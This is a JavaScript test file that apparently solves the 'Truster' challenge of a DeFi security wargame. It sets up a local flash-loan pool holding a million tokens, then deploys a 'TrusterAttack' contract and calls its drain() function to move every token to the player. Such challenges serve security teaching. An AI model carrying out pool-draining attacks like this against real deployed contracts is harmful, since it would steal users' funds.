const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Truster", function () {
  let deployer, player;
  let token, pool;

  const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    token = await (await ethers.getContractFactory("DamnValuableToken", deployer)).deploy();
    pool = await (await ethers.getContractFactory("TrusterLenderPool", deployer)).deploy(token.address);
    expect(await pool.token()).to.eq(token.address);

    await token.transfer(pool.address, TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

    expect(await token.balanceOf(player.address)).to.equal(0);
  });

  /**
   * More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.
   * The pool holds 1 million DVT tokens. You have nothing.
   * To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.
   */
  /** CODE YOUR SOLUTION HERE */
  it("Execution", async function () {
    // Deploy attacker contract
    const TrusterAttack = await ethers.getContractFactory("TrusterAttack", player);
    attackContract = await TrusterAttack.deploy(token.address, pool.address);

    console.log("BALANCE BEFORE ATTACK: ", String(await token.balanceOf(pool.address)));

    // Call the drain() function
    await attackContract.connect(player).drain();

    console.log("BALANCE _AFTER ATTACK: ", String(await token.balanceOf(pool.address)));
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(0);
  });
});
